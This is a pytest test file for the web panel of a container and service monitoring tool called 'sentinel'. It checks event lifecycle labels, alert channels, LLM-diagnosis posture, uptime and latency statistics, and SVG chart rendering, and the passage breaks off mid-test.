# tests/test_panel_view.py
import json
from datetime import datetime, timedelta, timezone

from sentinel.config import Settings
from sentinel.models import ProbeSample
from sentinel.panel import view
from sentinel.store import Store

TZ = timezone(timedelta(hours=8))
NOW = datetime(2026, 6, 14, 14, 32, tzinfo=TZ)
NOW_TS = int(NOW.timestamp())


def _settings(monkeypatch, **env):
    monkeypatch.setenv("FEISHU_VENDOR_WEBHOOK", "https://open.feishu.cn/hook/T")
    for k, v in env.items():
        monkeypatch.setenv(k, v)
    return Settings(_env_file=None)


def _seed_open(store, rule, subject, *, diag=None, tools=None, ts=None):
    eid = store.insert_event(
        ts=ts if ts is not None else NOW_TS - 600,
        rule=rule,
        subject=subject,
        severity="critical",
        status="open",
        detail=f"{subject} detail",
        payload_json="{}",
        diagnosis_status="pending",
        cooldown_until=0,
    )
    if diag is not None:
        store.set_diagnosis(
            eid,
            status="done",
            diagnosis_json=json.dumps(diag, ensure_ascii=False),
            tools_json=json.dumps(tools, ensure_ascii=False) if tools is not None else None,
        )
    return eid


def test_lifecycle_branches():
    from sentinel.findings import EventRecord
    from sentinel.panel.view import _lifecycle

    def rec(status, rule, ds):
        return EventRecord(
            id=1,
            ts=0,
            rule=rule,
            subject="x",
            severity="warning",
            status=status,
            detail="",
            payload_json="{}",
            diagnosis_status=ds,
            diagnosis_json=None,
            cooldown_until=0,
            resolved_ts=None,
        )

    assert _lifecycle(rec("open", "scan_failed_loki", "skipped")) == "scan_failed"
    assert _lifecycle(rec("open", "container_down", "pending")) == "investigating"
    assert _lifecycle(rec("open", "container_down", "done")) == "diagnosed"
    assert _lifecycle(rec("open", "container_down", "failed")) == "diagnosed_failed"
    assert _lifecycle(rec("open", "disk_usage", "skipped")) == "open"
    assert _lifecycle(rec("resolved", "container_down", "done")) == "recovered"
    # diag 未在运行(LLM 关或已配置待重启)时,pending 事件无人调查 → open,不是"调查中"
    assert _lifecycle(rec("open", "container_down", "pending"), diag_active=False) == "open"
    # 已诊断/恢复不受 diag_active 影响(不是 pending)
    assert _lifecycle(rec("open", "container_down", "done"), diag_active=False) == "diagnosed"
    assert _lifecycle(rec("resolved", "container_down", "done"), diag_active=False) == "recovered"


def test_channels_derivation(monkeypatch):
    from sentinel.panel.view import _channels

    s = _settings(
        monkeypatch,
        SENTINEL_TELEGRAM_BOT_TOKEN="t",
        SENTINEL_TELEGRAM_CHAT_ID="-1",
        SENTINEL_NTFY_URL="https://ntfy.sh/x",
        SENTINEL_WEBHOOK_URL="https://w/h",
    )
    assert _channels(s) == ["飞书", "Telegram", "ntfy", "webhook"]


async def test_build_overview_anomalies_and_posture(tmp_path, monkeypatch):
    settings = _settings(
        monkeypatch,
        SENTINEL_PROMETHEUS_URL="http://p:9090",
        SENTINEL_LOKI_URL="http://l:3100",
        LLM_BASE_URL="http://llm/v1",
        LLM_MODEL="deepseek-chat",
    )
    store = Store(str(tmp_path / "s.db"))
    _seed_open(
        store,
        "container_down",
        "postgres",
        diag={"summary": "OOM 被杀", "root_cause": "内存不足"},
        tools=[
            {
                "tool": "docker_inspect",
                "args": {"name": "postgres"},
                "output": json.dumps({"Env": ["A", "B", "C"]}),
                "ok": True,
            }
        ],
    )
    store.insert_event(
        ts=NOW_TS - 300,
        rule="scan_failed_loki",
        subject="log_scan",
        severity="warning",
        status="open",
        detail="d",
        payload_json="{}",
        diagnosis_status="skipped",
        cooldown_until=0,
    )
    ov = await view.build_overview(store, settings, now=NOW, docker=None)
    rules = {a["rule"]: a for a in ov["anomalies"]}
    assert rules["container_down"]["lifecycle"] == "diagnosed"
    assert rules["container_down"]["has_evidence"] is True
    assert rules["container_down"]["summary"] == "OOM 被杀"
    assert "rule_label" not in rules["container_down"]
    assert rules["container_down"]["rule"] == "container_down"
    assert rules["scan_failed_loki"]["is_scan_failure"] is True
    assert rules["scan_failed_loki"]["lifecycle"] == "scan_failed"
    p = ov["posture"]
    assert p["layers"] == {"prometheus": True, "loki": True, "docker": False, "llm": True}
    assert p["llm"] == {"enabled": True, "pending_restart": False, "model": "deepseek-chat"}
    assert p["docker"] == {"mode": "off", "read_only": True}
    assert p["channels"] == ["飞书"]
    assert p["env_redaction"] == [{"subject": "postgres", "count": 3}]
    assert p["monitored_containers"] is None  # docker=None
    assert p["open_count"] == 2
    store.close()


async def test_build_overview_recoveries_and_hygiene_split(tmp_path, monkeypatch):
    settings = _settings(monkeypatch)
    store = Store(str(tmp_path / "s.db"))
    # 开放 hygiene 事件 → 入 hygiene_alerts,不入 anomalies
    store.insert_event(
        ts=NOW_TS - 600,
        rule="backup_stale",
        subject="postgres",
        severity="warning",
        status="open",
        detail="d",
        payload_json="{}",
        diagnosis_status="skipped",
        cooldown_until=0,
    )
    # 24h 内恢复的事件
    rid = store.insert_event(
        ts=NOW_TS - 7200,
        rule="disk_usage",
        subject="/",
        severity="warning",
        status="open",
        detail="d",
        payload_json="{}",
        diagnosis_status="skipped",
        cooldown_until=0,
    )
    store.resolve_event(rid, resolved_ts=NOW_TS - 3600)
    # 探针样本 → hygiene.services uptime/p95
    store.add_probe_samples(
        [
            ProbeSample(ts=NOW_TS - 100, service="api", ok=True, status_code=200, latency_ms=120.0),
            ProbeSample(ts=NOW_TS - 50, service="api", ok=False, status_code=500, latency_ms=None),
        ]
    )
    ov = await view.build_overview(store, settings, now=NOW, docker=None)
    assert [a["rule"] for a in ov["anomalies"]] == []  # hygiene 不进 anomalies
    assert [h["rule"] for h in ov["hygiene"]["hygiene_alerts"]] == ["backup_stale"]
    assert [r["rule"] for r in ov["recoveries"]] == ["disk_usage"]
    assert ov["recoveries"][0]["lifecycle"] == "recovered"
    assert ov["recoveries"][0]["resolved_str"]  # 非空
    assert ov["posture"]["resolved_24h"] == 1
    svc = {s["service"]: s for s in ov["hygiene"]["services"]}
    assert svc["api"]["uptime_pct"] == 50.0  # 1 ok / 2 total
    assert svc["api"]["p95_ms"] == 120.0
    store.close()


async def test_monitored_containers_excludes_self_and_proxy(tmp_path, monkeypatch):
    settings = _settings(
        monkeypatch,
        SENTINEL_DOCKER_HOST="tcp://docker-proxy:2375",
        SENTINEL_DOCKER_EXCLUDE="ignoreme",
    )
    store = Store(str(tmp_path / "s.db"))

    class _FakeDocker:
        async def ps(self, *, all=True):
            return [
                {"Names": ["/api"], "Image": "api:1"},
                {"Names": ["/wm"], "Image": "ghcr.io/x/watchmend:0.1.1"},
                {"Names": ["/px"], "Image": "tecnativa/docker-socket-proxy:1"},
                {"Names": ["/ignoreme"], "Image": "redis:7"},
            ]

    ov = await view.build_overview(store, settings, now=NOW, docker=_FakeDocker())
    assert ov["posture"]["monitored_containers"] == 1  # 仅 api
    assert ov["posture"]["docker"] == {"mode": "proxy", "read_only": True}
    assert ov["posture"]["layers"]["docker"] is True
    store.close()


async def test_monitored_containers_none_on_ps_failure(tmp_path, monkeypatch):
    settings = _settings(monkeypatch, SENTINEL_DOCKER_HOST="tcp://docker-proxy:2375")
    store = Store(str(tmp_path / "s.db"))

    class _BoomDocker:
        async def ps(self, *, all=True):
            raise RuntimeError("unreachable")

    ov = await view.build_overview(store, settings, now=NOW, docker=_BoomDocker())
    assert ov["posture"]["monitored_containers"] is None
    store.close()


async def test_build_overview_empty_store_degrades(tmp_path, monkeypatch):
    settings = _settings(monkeypatch)  # 无 prom/loki/docker/llm
    store = Store(str(tmp_path / "s.db"))
    ov = await view.build_overview(store, settings, now=NOW, docker=None)
    assert ov["anomalies"] == [] and ov["recoveries"] == []
    assert ov["hygiene"]["services"] == [] and ov["hygiene"]["hygiene_alerts"] == []
    assert ov["posture"]["llm"] == {"enabled": False, "pending_restart": False, "model": None}
    assert ov["posture"]["docker"]["mode"] == "off"
    assert ov["posture"]["channels"] == ["飞书"]
    assert ov["posture"]["env_redaction"] == []
    assert ov["now_str"] == "2026-06-14 14:32"
    assert ov["refresh_seconds"] == 30
    store.close()


async def test_build_event_detail_with_evidence(tmp_path, monkeypatch):
    settings = _settings(monkeypatch, LLM_BASE_URL="http://llm/v1", LLM_MODEL="m")
    store = Store(str(tmp_path / "s.db"))
    eid = _seed_open(
        store,
        "container_down",
        "postgres",
        diag={
            "summary": "OOM",
            "root_cause": "内存不足",
            "suggested_commands": ["docker restart postgres"],
            "confidence": "high",
        },
        tools=[
            {
                "tool": "docker_logs",
                "args": {"name": "postgres", "tail": 100},
                "output": "FATAL: out of memory",
                "ok": True,
            }
        ],
    )
    d = view.build_event_detail(store, settings, eid)
    assert d["llm_enabled"] is True
    assert d["diagnosis"]["root_cause"] == "内存不足"
    assert d["tool_calls"][0]["tool"] == "docker_logs"
    assert d["tool_calls"][0]["args_str"] == json.dumps(
        {"name": "postgres", "tail": 100}, ensure_ascii=False
    )
    assert d["tool_calls"][0]["ok"] is True
    assert d["tool_calls"][0]["output"] == "FATAL: out of memory"
    assert d["event"]["detail"] == "postgres detail"
    store.close()


def test_build_event_detail_missing_returns_none(tmp_path, monkeypatch):
    settings = _settings(monkeypatch)
    store = Store(str(tmp_path / "s.db"))
    assert view.build_event_detail(store, settings, 999999) is None
    store.close()


def test_build_event_detail_no_llm_no_evidence(tmp_path, monkeypatch):
    settings = _settings(monkeypatch)  # llm off
    store = Store(str(tmp_path / "s.db"))
    eid = store.insert_event(
        ts=NOW_TS - 600,
        rule="disk_usage",
        subject="/",
        severity="warning",
        status="open",
        detail="d",
        payload_json="{}",
        diagnosis_status="skipped",
        cooldown_until=0,
    )
    d = view.build_event_detail(store, settings, eid)
    assert d["llm_enabled"] is False
    assert d["diagnosis"] is None
    assert d["tool_calls"] == []
    store.close()


async def test_build_overview_llm_from_config_overrides_env(tmp_path, monkeypatch):
    # llm.yaml 是真源:env 留空但 yaml 配了 → 面板姿态反映 yaml 的 model
    from sentinel.config import Settings
    from sentinel.llm_config import LLMConfig

    path = tmp_path / "llm.yaml"
    path.write_text(
        "active: deepseek\nproviders:\n  deepseek:\n"
        "    base_url: https://api.deepseek.com/v1\n    model: deepseek-chat\n    api_key: ''\n",
        encoding="utf-8",
    )
    monkeypatch.setenv("FEISHU_VENDOR_WEBHOOK", "https://open.feishu.cn/hook/T")
    monkeypatch.setenv("SENTINEL_LLM_CONFIG_FILE", str(path))
    settings = Settings(_env_file=None)  # 注意:无 LLM_BASE_URL/MODEL
    cfg = LLMConfig(settings)
    store = Store(str(tmp_path / "s.db"))
    ov = await view.build_overview(store, settings, now=NOW, docker=None, llm_config=cfg)
    assert ov["posture"]["llm"] == {
        "enabled": True,
        "pending_restart": False,
        "model": "deepseek-chat",
    }
    assert ov["posture"]["layers"]["llm"] is True
    store.close()


def test_build_event_detail_llm_from_config(tmp_path, monkeypatch):
    from sentinel.config import Settings
    from sentinel.llm_config import LLMConfig

    path = tmp_path / "llm.yaml"
    path.write_text(
        "active: deepseek\nproviders:\n  deepseek:\n"
        "    base_url: https://api.deepseek.com/v1\n    model: deepseek-chat\n    api_key: ''\n",
        encoding="utf-8",
    )
    monkeypatch.setenv("FEISHU_VENDOR_WEBHOOK", "https://open.feishu.cn/hook/T")
    monkeypatch.setenv("SENTINEL_LLM_CONFIG_FILE", str(path))
    settings = Settings(_env_file=None)
    cfg = LLMConfig(settings)
    store = Store(str(tmp_path / "s.db"))
    eid = store.insert_event(
        ts=NOW_TS - 600,
        rule="disk_usage",
        subject="/",
        severity="warning",
        status="open",
        detail="d",
        payload_json="{}",
        diagnosis_status="skipped",
        cooldown_until=0,
    )
    d = view.build_event_detail(store, settings, eid, llm_config=cfg)
    assert d["llm_enabled"] is True
    store.close()


def _llm_cfg(tmp_path, monkeypatch):
    """构造一个 active 有效的 LLMConfig(供 pending_restart 用例)。"""
    from sentinel.config import Settings
    from sentinel.llm_config import LLMConfig

    path = tmp_path / "llm.yaml"
    path.write_text(
        "active: deepseek\nproviders:\n  deepseek:\n"
        "    base_url: https://api.deepseek.com/v1\n    model: deepseek-chat\n    api_key: ''\n",
        encoding="utf-8",
    )
    monkeypatch.setenv("FEISHU_VENDOR_WEBHOOK", "https://open.feishu.cn/hook/T")
    monkeypatch.setenv("SENTINEL_LLM_CONFIG_FILE", str(path))
    settings = Settings(_env_file=None)
    return LLMConfig(settings), settings


async def test_pending_restart_when_configured_but_diag_unregistered(tmp_path, monkeypatch):
    # 启动后才配 LLM(current() 非空)但 diag job 启动时未注册 → 已配置·待重启,
    # 且 pending 事件显示 open(没人在查),不是"调查中"。
    cfg, settings = _llm_cfg(tmp_path, monkeypatch)
    store = Store(str(tmp_path / "s.db"))
    _seed_open(store, "container_down", "postgres")  # pending,未诊断
    ov = await view.build_overview(
        store, settings, now=NOW, docker=None, llm_config=cfg, diag_registered=False
    )
    assert ov["posture"]["llm"] == {
        "enabled": True,
        "pending_restart": True,
        "model": "deepseek-chat",
    }
    assert ov["posture"]["layers"]["llm"] is True  # 层仍算"已配置"
    assert {a["rule"]: a for a in ov["anomalies"]}["container_down"]["lifecycle"] == "open"
    store.close()


async def test_no_pending_restart_when_diag_registered(tmp_path, monkeypatch):
    # 启动时就配好 LLM → diag job 已注册 → 不待重启,pending 正常显示"调查中"。
    cfg, settings = _llm_cfg(tmp_path, monkeypatch)
    store = Store(str(tmp_path / "s.db"))
    _seed_open(store, "container_down", "postgres")
    ov = await view.build_overview(
        store, settings, now=NOW, docker=None, llm_config=cfg, diag_registered=True
    )
    assert ov["posture"]["llm"]["pending_restart"] is False
    assert {a["rule"]: a for a in ov["anomalies"]}["container_down"]["lifecycle"] == "investigating"
    store.close()


def test_event_detail_pending_restart_marks_open(tmp_path, monkeypatch):
    # 详情页同样:待重启时 pending 事件生命周期显示 open。
    cfg, settings = _llm_cfg(tmp_path, monkeypatch)
    store = Store(str(tmp_path / "s.db"))
    eid = _seed_open(store, "container_down", "postgres")
    d = view.build_event_detail(store, settings, eid, llm_config=cfg, diag_registered=False)
    assert d["event"]["lifecycle"] == "open"
    store.close()


async def test_build_overview_keeps_legacy_keys_and_adds_new(tmp_path, monkeypatch):
    settings = _settings(monkeypatch)
    store = Store(str(tmp_path / "s.db"))
    ov = await view.build_overview(store, settings, now=NOW, docker=None)
    # 既有键保留（默认 window_days=90）
    for key in ("now_str", "refresh_seconds", "posture", "anomalies", "recoveries", "hygiene"):
        assert key in ov
    # 新增键
    assert ov["window_days"] == 90
    assert isinstance(ov["health"], list)
    assert "probe_engine_live" in ov["host_self"] and "llm" in ov["host_self"]
    assert ov["events"] == {"items": [], "page": 1, "total_pages": 1, "total": 0, "page_size": 8}
    store.close()


async def test_build_overview_page_size_zero_no_crash(tmp_path, monkeypatch):
    # SENTINEL_PANEL_PAGE_SIZE=0 不应让面板首页 500（ZeroDivisionError）；钳到 ≥1。
    settings = _settings(monkeypatch, SENTINEL_PANEL_PAGE_SIZE="0")
    store = Store(str(tmp_path / "s.db"))
    for i in range(3):
        store.insert_event(
            ts=NOW_TS - i * 60,
            rule="service_down",
            subject="api",
            severity="critical",
            status="open",
            detail="d",
            payload_json="{}",
            diagnosis_status="skipped",
            cooldown_until=0,
        )
    ov = await view.build_overview(store, settings, now=NOW, docker=None)
    ev = ov["events"]
    assert ev["page_size"] == 1  # 0 钳到 1
    assert ev["total"] == 3 and ev["total_pages"] == 3
    assert ev["page"] == 1 and len(ev["items"]) == 1
    store.close()


async def test_build_overview_engine_live_across_midnight(tmp_path, monkeypatch):
    # 午夜后查看：最新探针在昨日 23:59（4 分钟前），按 5 分钟间隔应判 live，
    # 不能因"只看今日零点后样本"误判 unknown(None)。
    settings = _settings(monkeypatch)  # probe_interval 默认 300 → 阈值 600s
    store = Store(str(tmp_path / "s.db"))
    after_midnight = datetime(2026, 6, 14, 0, 3, tzinfo=TZ)
    am_ts = int(after_midnight.timestamp())
    store.add_probe_samples(  # am_ts-240 = 昨日 23:59，落在今日午夜之前
        [ProbeSample(ts=am_ts - 240, service="api", ok=True, status_code=200, latency_ms=12.0)]
    )
    ov = await view.build_overview(store, settings, now=after_midnight, docker=None)
    assert ov["host_self"]["probe_engine_live"] is True
    store.close()


async def test_build_overview_engine_unknown_when_never_probed(tmp_path, monkeypatch):
    # 从未探测过（全表无样本）→ 引擎活性 unknown(None)，区别于"探测过但陈旧"=False。
    settings = _settings(monkeypatch)
    store = Store(str(tmp_path / "s.db"))
    ov = await view.build_overview(store, settings, now=NOW, docker=None)
    assert ov["host_self"]["probe_engine_live"] is None
    store.close()


async def test_health_bars_sorted_worst_first(tmp_path, monkeypatch):
    # 健康柱条按"今日现态最坏优先"排序，同状态内按服务名；
    # 服务名故意与期望顺序逆排，证明排序键是状态而非字母序（issue #11）。
    settings = _settings(monkeypatch)
    store = Store(str(tmp_path / "s.db"))

    def _samples(service, n_ok, n_fail):
        out = []
        for i in range(n_ok):
            out.append(
                ProbeSample(
                    ts=NOW_TS - 100 - i,
                    service=service,
                    ok=True,
                    status_code=200,
                    latency_ms=10.0,
                )
            )
        for i in range(n_fail):
            out.append(
                ProbeSample(
                    ts=NOW_TS - 200 - i,
                    service=service,
                    ok=False,
                    status_code=500,
                    latency_ms=None,
                )
            )
        return out

    store.add_probe_samples(
        _samples("aaa", 2, 0)  # 100% → ok（字母最前）
        + _samples("bbb", 2, 0)  # 100% → ok（同状态，名次后）
        + _samples("mmm", 4, 1)  # 80% → partial
        + _samples("zzz", 1, 2)  # 33% → down（字母最后）
    )
    ov = await view.build_overview(store, settings, now=NOW, docker=None, window_days=30)
    order = [b["service"] for b in ov["health"]]
    # down → partial → ok(aaa) → ok(bbb)：状态主序、同状态内字母次序
    assert order == ["zzz", "mmm", "aaa", "bbb"]
    assert ov["health"][0]["days"][-1]["state"] == "down"
    assert ov["health"][1]["days"][-1]["state"] == "partial"
    store.close()


async def test_build_overview_event_feed_pagination(tmp_path, monkeypatch):
    settings = _settings(monkeypatch)
    store = Store(str(tmp_path / "s.db"))
    for i in range(10):  # 10 起 open 事件，均落今日窗口内
        store.insert_event(
            ts=NOW_TS - i * 60,
            rule="service_down",
            subject="api",
            severity="critical",
            status="open",
            detail="d",
            payload_json="{}",
            diagnosis_status="skipped",
            cooldown_until=0,
        )
    ov = await view.build_overview(store, settings, now=NOW, docker=None, window_days=30, page=1)
    assert ov["window_days"] == 30
    ev = ov["events"]
    assert ev["total"] == 10 and ev["page_size"] == 8 and ev["total_pages"] == 2
    assert ev["page"] == 1 and len(ev["items"]) == 8
    ev2 = (await view.build_overview(store, settings, now=NOW, docker=None, page=2))["events"]
    assert ev2["page"] == 2 and len(ev2["items"]) == 2
    # 越界页钳到末页
    ev9 = (await view.build_overview(store, settings, now=NOW, docker=None, page=99))["events"]
    assert ev9["page"] == 2 and len(ev9["items"]) == 2
    # 事件项沿用 _event_view 结构（含原始 rule）
    assert ev["items"][0]["rule"] == "service_down"
    store.close()


def test_svg_line_maps_series_to_path_with_padding():
    from sentinel.panel.view import _svg_line

    out = _svg_line([100.0, 50.0, 100.0], w=100.0, h=40.0, pad_frac=0.0)
    # 3 点等距:x = 0,50,100;无 padding 时 max→y=0,min→y=h
    assert out["line_d"] == "M0.0,0.0 L50.0,40.0 L100.0,0.0"
    # 无缺口 → area_d 自底边闭合
    assert out["area_d"] == "M0.0,40.0 L0.0,0.0 50.0,40.0 100.0,0.0 L100.0,40.0 Z"


def test_svg_line_breaks_on_none_gap_and_omits_area():
    from sentinel.panel.view import _svg_line

    out = _svg_line([100.0, None, 50.0], w=100.0, h=40.0, pad_frac=0.0)
    # 中间 None → 用 M 断开,缺口两侧不连线
    assert out["line_d"] == "M0.0,0.0 M100.0,40.0"
    # 有缺口 → 不画面积
    assert out["area_d"] == ""


def test_svg_line_too_few_points_returns_empty():
    from sentinel.panel.view import _svg_line

    assert _svg_line([], w=100.0, h=40.0) == {"line_d": "", "area_d": ""}
    assert _svg_line([42.0], w=100.0, h=40.0) == {"line_d": "", "area_d": ""}
    assert _svg_line([None, None], w=100.0, h=40.0) == {"line_d": "", "area_d": ""}


def test_svg_line_flat_series_does_not_divide_by_zero():
    from sentinel.panel.view import _svg_line

    out = _svg_line([100.0, 100.0, 100.0], w=100.0, h=40.0, pad_frac=0.08)
    # 全等值:span=0 → 用 1.0 兜底,不抛异常,line 落在中线附近
    assert out["line_d"].startswith("M0.0,")
    assert "L" in out["line_d"]


def _health_row(service, uptime_pct, today_state):
    # 模拟 _service_health_bars 输出的一行(只放本测用得到的字段)
    return {
        "service": service,
        "label": service,
        "uptime_pct": uptime_pct,
        "p95_ms": None,
        "days": [
            {"date": "2026-06-14", "state": today_state, "is_today": True, "uptime_pct": uptime_pct}
        ],
    }


def test_overall_uptime_pct_equal_weight_excludes_nodata():
    from sentinel.panel.view import overall_uptime_pct

    health = [
        _health_row("a", 100.0, "ok"),
        _health_row("b", 98.0, "degraded"),
        _health_row("c", None, "nodata"),  # nodata 排除
    ]
    assert overall_uptime_pct(health) == 99.0  # (100+98)/2


def test_overall_uptime_pct_all_nodata_returns_none():
    from sentinel.panel.view import overall_uptime_pct

    assert overall_uptime_pct([_health_row("a", None, "nodata")]) is None
    assert overall_uptime_pct([]) is None


def test_overall_ring_counts_today_state_normalized():
    from sentinel.panel.view import overall_ring

    health = [
        _health_row("a", 100.0, "ok"),
        _health_row("b", 100.0, "ok"),
        _health_row("c", 80.0, "down"),
        _health_row("d", None, "nodata"),  # nodata = 环底色余量,不计入四段
    ]
    ring = overall_ring(health)
    assert ring == {"ok": 50.0, "degraded": 0.0, "partial": 0.0, "down": 25.0}


def test_overall_ring_empty_health_is_all_zero():
    from sentinel.panel.view import overall_ring

    assert overall_ring([]) == {"ok": 0.0, "degraded": 0.0, "partial": 0.0, "down": 0.0}


def test_days_clean_floor_division():
    from sentinel.panel.view import _days_clean

    now_ts = 1_000_000
    assert _days_clean(now_ts - 3 * 86400 - 10, now_ts) == 3  # 3 天多 → 3
    assert _days_clean(now_ts - 100, now_ts) == 0  # 不足 1 天 → 0
    assert _days_clean(now_ts + 500, now_ts) == 0  # 未来 ts(时钟漂移)→ 钳 0
    assert _days_clean(None, now_ts) is None  # 从无事件


def test_overall_trend_series_per_day_equal_weight():
    from sentinel.panel.view import _overall_trend_series

    health = [
        {"days": [{"uptime_pct": 100.0}, {"uptime_pct": 90.0}, {"uptime_pct": None}]},
        {"days": [{"uptime_pct": 80.0}, {"uptime_pct": None}, {"uptime_pct": None}]},
    ]
    # 第0天 (100+80)/2=90;第1天 仅90;第2天 全 None → None
    assert _overall_trend_series(health) == [90.0, 90.0, None]


def test_overall_trend_series_empty_health():
    from sentinel.panel.view import _overall_trend_series

    assert _overall_trend_series([]) == []


async def test_build_overview_exposes_hero_and_mini(tmp_path, monkeypatch):
    settings = _settings(monkeypatch)
    store = Store(str(tmp_path / "s.db"))
    # 今日样本:api 全 ok(4/4),db 半数失败(1/2)
    store.add_probe_samples(
        [
            ProbeSample(ts=NOW_TS - 400, service="api", ok=True, status_code=200, latency_ms=10.0),
            ProbeSample(ts=NOW_TS - 300, service="api", ok=True, status_code=200, latency_ms=10.0),
            ProbeSample(ts=NOW_TS - 200, service="api", ok=True, status_code=200, latency_ms=10.0),
            ProbeSample(ts=NOW_TS - 100, service="api", ok=True, status_code=200, latency_ms=10.0),
            ProbeSample(ts=NOW_TS - 80, service="db", ok=True, status_code=200, latency_ms=10.0),
            ProbeSample(ts=NOW_TS - 40, service="db", ok=False, status_code=500, latency_ms=None),
        ]
    )
    # 全表最新事件 = 2 天前(已恢复,open_count==0)→ days_clean=2
    rid = store.insert_event(
        ts=NOW_TS - 2 * 86400,
        rule="service_down",
        subject="db",
        severity="critical",
        status="open",
        detail="d",
        payload_json="{}",
        diagnosis_status="skipped",
        cooldown_until=0,
    )
    store.resolve_event(rid, resolved_ts=NOW_TS - 2 * 86400 + 600)
    overview = await view.build_overview(store, settings, now=NOW)

    hero = overview["hero"]
    assert hero["uptime_pct"] == view.overall_uptime_pct(overview["health"])
    assert set(hero["ring"]) == {"ok", "degraded", "partial", "down"}
    assert hero["days_clean"] == 2
    assert set(hero["trend"]) == {"line_d", "area_d"}
    # 每个 health 行都带 mini_pts 字符串
    assert all(isinstance(r["mini_pts"], str) for r in overview["health"])
    store.close()


def test_mini_sparkline_points():
    from sentinel.panel.view import _mini_sparkline_points

    assert _mini_sparkline_points([None, None]) == ""  # 全缺 → 空串(模板不渲染)
    d = _mini_sparkline_points([10.0, 20.0, 15.0])
    assert d.startswith("M") and "L" in d  # 折线路径起于 M、续以 L


def test_build_services_list_shape(tmp_path, monkeypatch):
    settings = _settings(monkeypatch)
    store = Store(str(tmp_path / "s.db"))
    today = NOW.date()
    store.upsert_probe_daily(
        "api", (today - timedelta(days=1)).isoformat(), total=100, ok_count=100, p50=10.0, p95=20.0
    )
    store.add_probe_samples(
        [ProbeSample(ts=NOW_TS - 30, service="api", ok=True, status_code=200, latency_ms=12.0)]
    )
    data = view.build_services_list(store, settings, now=NOW, window_days=30)
    assert data["window_days"] == 30
    svcs = data["services"]
    assert len(svcs) == 1 and svcs[0]["service"] == "api"
    assert svcs[0]["uptime_pct"] == 100.0  # 今日全 ok
    assert svcs[0]["state"] == "ok"
    assert isinstance(svcs[0]["p95_pts"], str)  # 迷你 sparkline path d
    # 逐日 p95 已挂在 days 上(服务详情大图复用)
    assert any(d.get("p95_ms") is not None for d in svcs[0]["days"])
    store.close()


# —— Phase 2:服务详情 view 单测 ——


def test_latency_chart_dual_line_and_band():
    from sentinel.panel.view import _latency_chart

    c = _latency_chart([10.0, 12.0, 11.0], [20.0, 30.0, 25.0])
    assert c["p50_d"].startswith("M") and "L" in c["p50_d"]
    assert c["p95_d"].startswith("M") and "L" in c["p95_d"]
    # 无缺口 → p50–p95 区间面积闭合(M…L…Z)
    assert c["band_d"].startswith("M") and c["band_d"].endswith("Z")


def test_latency_chart_too_few_points_empty():
    from sentinel.panel.view import _latency_chart

    c = _latency_chart([10.0], [20.0])
    assert c == {"p50_d": "", "p95_d": "", "band_d": ""}


def test_latency_chart_gap_drops_band_keeps_lines():
    from sentinel.panel.view import _latency_chart

    c = _latency_chart([10.0, None, 12.0], [20.0, 25.0, 30.0])
    assert c["band_d"] == ""  # 任一线含缺口 → 不填面积
    assert c["p50_d"].count("M") == 2  # 缺口处折线断开后重新起笔
    assert c["p95_d"].startswith("M")


def test_status_code_buckets_timeout_and_order():
    from sentinel.panel.view import _status_code_buckets

    samples = [
        ProbeSample(ts=1, service="api", ok=True, status_code=200, latency_ms=5.0),
        ProbeSample(ts=2, service="api", ok=True, status_code=200, latency_ms=6.0),
        ProbeSample(ts=3, service="api", ok=False, status_code=500, latency_ms=None),
        ProbeSample(ts=4, service="api", ok=False, status_code=None, latency_ms=None),
    ]
    buckets = _status_code_buckets(samples)
    assert buckets[0]["code"] == "200" and buckets[0]["count"] == 2
    codes = {b["code"] for b in buckets}
    assert "timeout" in codes  # status_code None → timeout 桶
    assert sum(b["count"] for b in buckets) == 4
    assert abs(sum(b["pct"] for b in buckets) - 100.0) < 0.5


def test_status_code_buckets_empty():
    from sentinel.panel.view import _status_code_buckets

    assert _status_code_buckets([]) == []


def test_sample_latency_series_breaks_on_failure_and_downsamples():
    from sentinel.panel.view import _sample_latency_series

    samples = [
        ProbeSample(ts=10, service="api", ok=True, status_code=200, latency_ms=11.0),
        ProbeSample(ts=20, service="api", ok=False, status_code=500, latency_ms=None),
        ProbeSample(ts=30, service="api", ok=True, status_code=200, latency_ms=13.0),
    ]
    lat = _sample_latency_series(samples, cap=10)
    assert lat == [11.0, None, 13.0]  # 失败样本 → None 断线
    many = [
        ProbeSample(ts=i, service="api", ok=True, status_code=200, latency_ms=float(i))
        for i in range(100)
    ]
    assert len(_sample_latency_series(many, cap=20)) == 20  # 下采样到 cap


def test_event_x_marks_in_window_and_clamp():
    from sentinel.findings import EventRecord
    from sentinel.panel.view import _event_x_marks

    def ev(eid, ts):
        return EventRecord(
            id=eid,
            ts=ts,
            rule="latency_degraded",
            subject="api",
            severity="warning",
            status="open",
            detail="d",
            payload_json="{}",
            diagnosis_status="skipped",
            diagnosis_json=None,
            cooldown_until=0,
            resolved_ts=None,
        )

    marks = _event_x_marks(
        [ev(1, 0), ev(2, 500), ev(3, 1000), ev(4, 5000)],
        start_ts=0,
        end_ts=1000,
        tz=TZ,
        w=600.0,
    )
    ids = [m["id"] for m in marks]
    assert ids == [1, 2, 3]  # ts=5000 在窗外被丢弃
    assert all(0.0 <= m["x"] <= 600.0 for m in marks)
    assert marks[0]["x"] == 0.0 and marks[2]["x"] == 600.0


def test_latency_compare_replicates_engine_threshold(tmp_path, monkeypatch):
    settings = _settings(monkeypatch)
    store = Store(str(tmp_path / "s.db"))
    today = NOW.date()
    # 7 日基线均 100ms;ratio=2.0、margin=500 → threshold=max(200, 600)=600
    for i in range(1, 8):
        store.upsert_probe_daily(
            "api",
            (today - timedelta(days=i)).isoformat(),
            total=10,
            ok_count=10,
            p50=50.0,
            p95=100.0,
        )
    cmp = view._latency_compare(
        store, settings, "api", current_p95=700.0, before_date=today.isoformat()
    )
    assert cmp["baseline_ms"] == 100
    assert cmp["threshold_ms"] == 600  # max(100*2, 100+500)
    assert cmp["breached"] is True  # 700 > 600
    assert cmp["baseline_days"] == 7
    store.close()


def test_latency_compare_no_baseline(tmp_path, monkeypatch):
    settings = _settings(monkeypatch)
    store = Store(str(tmp_path / "s.db"))
    cmp = view._latency_compare(
        store, settings, "api", current_p95=42.0, before_date=NOW.date().isoformat()
    )
    assert cmp["baseline_ms"] is None and cmp["threshold_ms"] is None
    assert cmp["breached"] is None and cmp["fill_pct"] is None
    assert cmp["current_ms"] == 42  # current 仍回填
    store.close()


def test_build_service_detail_daily_shape(tmp_path, monkeypatch):
    settings = _settings(monkeypatch)
    store = Store(str(tmp_path / "s.db"))
    today = NOW.date()
    store.upsert_probe_daily(
